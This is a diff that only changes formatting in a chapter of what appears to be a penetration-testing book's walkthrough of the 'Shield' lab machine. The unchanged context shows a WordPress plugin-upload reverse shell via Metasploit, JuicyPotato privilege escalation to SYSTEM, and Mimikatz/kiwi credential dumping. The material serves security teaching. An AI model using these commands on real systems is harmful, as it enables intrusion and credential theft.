@@ -102,13 +102,13 @@ The objective of the challenge is to gain access to the box to explore and hopef
 
 On Windows it is the **cmd.exe** program, on Linux it is **Bash** or **Zsh** that runs in the terminal program. We have been using a shell on our Parrot box to carry out all of the actions we have taken so far. When a shell is run locally on a box, it is a local shell. Remote shells are those that are accessed over a network connection so that the commands are typed on the local attacker box but run on the remote machine. We can set up a remote shell by running a program on our local Parrot box which listens for connections and then run a program on the remote machine that connects back to the listener and establishes the remote shell session. This is called a reverse shell.
 
-We will explore all of this in more detail in the next chapter, but for the moment, we are going to get a reverse shell using **Meterpreter**. Time to turn to **Metasploit** which has a way of launching a **Meterpreter** reverse shell in **PHP**! Start **Metasploit** by selecting it from the menu or by running
+We will explore all of this in more detail in the next chapter, but for the moment, we are going to get a reverse shell using **Meterpreter**. Time to turn to Metasploit which has a way of launching a Meterpreter reverse shell in PHP! Start Metasploit by selecting it from the menu or by running
 
 ```bash
 sudo msfconsole-start
 ```
 
-In **Metasploit**, we are going to use an existing exploit of the WordPress administrator account by uploading a plugin to **WordPress** that is actually a reverse shell. Plugins, as we see later when we craft our own custom plugin, are ways of packaging **PHP** code to add functionality to **WordPress**. The security vulnerability with this is that this code has access to do whatever the user account that is running WordPress can do. There is nothing limiting what code in plugins can do normally. In the case of this exploit, we use the command:
+In Metasploit, we are going to use an existing exploit of the WordPress administrator account by uploading a plugin to WordPress that is actually a reverse shell. Plugins, as we see later when we craft our own custom plugin, are ways of packaging PHP code to add functionality to WordPress. The security vulnerability with this is that this code has access to do whatever the user account that is running WordPress can do. There is nothing limiting what code in plugins can do normally. In the case of this exploit, we use the command:
 
 ```bash
 use exploit/unix/webapp/wp_admin_shell_upload
@@ -193,7 +193,7 @@ Final size of exe file: 206848 bytes
 If you have problems running msfvenom within Metasploit, you can run it from the command line in bash
 {% endhint %}
 
-Once the payload is created, we can upload it to the Shield machine.  We need to get back into the current **Meterpreter** session first. We do that with the sessions command. Just typing sessions will list the current sessions available. We can interact with a session using the **sessions -i &lt;session number&gt; command**:
+Once the payload is created, we can upload it to the Shield machine.  We need to get back into the current Meterpreter session first. We do that with the sessions command. Just typing sessions will list the current sessions available. We can interact with a session using the **sessions -i &lt;session number&gt; command**:
 
 ```bash
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > sessions
@@ -278,7 +278,7 @@ We are now in a new, more powerful Meterpreter session and typing help will show
 
 Now that we have achieved initial access, the process of further enumeration or discovery takes place. We are looking for ways of elevating our user account to administrator and gain total ownership of the box. This process is called **privilege escalation** or **priv esc** for short.
 
-In **Metasploit**, you can run a command that will look for particular vulnerabilities that will lead to privilege escalation. This command is the “**local\_exploit\_suggester**”
+In Metasploit, you can run a command that will look for particular vulnerabilities that will lead to privilege escalation. This command is the “**local\_exploit\_suggester**”
 
 ```text
 meterpreter > bg
@@ -327,16 +327,16 @@ Add this instead   --> return CheckCode::Safe("No target for win32k.sys
 restart Metasploit after this.
 {% endhint %}
 
-From experience, I know that the most promising exploit is going to be _**ms16\_075\_reflection\_juicy**_ which is the _**JuicyPotato**_ exploit. This vulnerability allows for privilege escalation through impersonation of the System user. It occurs if the user doing the exploit has certain privileges, notable the _**SeImpersonate**_ privilege. Unfortunately, the _**Metasploit**_ module doesn’t work as is and so you have to do this manually by downloading _**JuicyPotato.exe**_ from [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
+From experience, I know that the most promising exploit is going to be _**ms16\_075\_reflection\_juicy**_ which is the _**JuicyPotato**_ exploit. This vulnerability allows for privilege escalation through impersonation of the System user. It occurs if the user doing the exploit has certain privileges, notable the _**SeImpersonate**_ privilege. Unfortunately, the Metasploit module doesn’t work as is and so you have to do this manually by downloading _**JuicyPotato.exe**_ from [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
 
-We can run another handler as before and then upload _**JuicyPotato.exe**_. One more step however as executing it from the Meterpreter prompt doesn’t work. So you can drop into a _**cmd.exe**_ shell prompt by typing “_**shell**_”. From the command prompt, you can then run the _**JuicyPotato.exe**_
+We can run another handler as before and then upload JuicyPotato.exe. One more step however as executing it from the Meterpreter prompt doesn’t work. So you can drop into a cmd.exe shell prompt by typing “_**shell**_”. From the command prompt, you can then run the JuicyPotato.exe
 
 ```bash
 JuicyPotato.exe -t * -p ^
 C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
 ```
 
-Remember to change the path of the _**revshell.exe**_ to the actual path name _**Meterpreter**_ has used. When _**JuicyPotato.exe**_ runs, it will start another _**Meterpreter**_ session but as the privileged user that the exploit has impersonated, _**NT AUTHORITY\SYSTEM**_. From there, you can cd \(change directory\) into the **c:\Users\Administrator\Desktop** directory and find the flag.
+Remember to change the path of the _**revshell.exe**_ to the actual path name Meterpreter has used. When _**JuicyPotato.exe**_ runs, it will start another _**Meterpreter**_ session but as the privileged user that the exploit has impersonated, _**NT AUTHORITY\SYSTEM**_. From there, you can cd \(change directory\) into the **c:\Users\Administrator\Desktop** directory and find the flag.
 
 ```bash
 meterpreter > shell
@@ -369,12 +369,12 @@ Server username: NT AUTHORITY\SYSTEM
 
 Now that we have administrator privileges, we can do some more discovery to look for any other useful information on the box, in particular, other user accounts and their passwords.
 
-We will come back to this later in the book and deal with it in more details but what you will do is take advantage of a module that _**Meterpreter**_ allows us to run called _**kiwi**_ that is the module that runs _**Mimikatz**_ commands. _**Mimikatz**_ is a program that has been designed to search for and collect credentials on Windows from a number of different places where these are commonly stored. These include the two main sources:
+We will come back to this later in the book and deal with it in more details but what you will do is take advantage of a module that Meterpreter allows us to run called _**kiwi**_ that is the module that runs _**Mimikatz**_ commands. Mimikatz is a program that has been designed to search for and collect credentials on Windows from a number of different places where these are commonly stored. These include the two main sources:
 
-* Passwords stored in memory. _**Mimikatz**_ looks for passwords that may be in the memory of the _**Local Security Authority Subsystem Service**_ \(_**LSASS**_\) process
+* Passwords stored in memory. Mimikatz looks for passwords that may be in the memory of the _**Local Security Authority Subsystem Service**_ \(_**LSASS**_\) process
 * Kerberos: Using an API to access Kerberos credentials \(tickets\) again from memory
 
-To run _**Kiwi**_, you type “load kiwi” and then “creds\_all”. From this, you can see the user “sandra” has the password “Password1234!” which has been extracted from Kerberos running on the machine.
+To run Kiwi, you type “load kiwi” and then “creds\_all”. From this, you can see the user “sandra” has the password “Password1234!” which has been extracted from Kerberos running on the machine.
 
 ```text
 meterpreter > creds_all
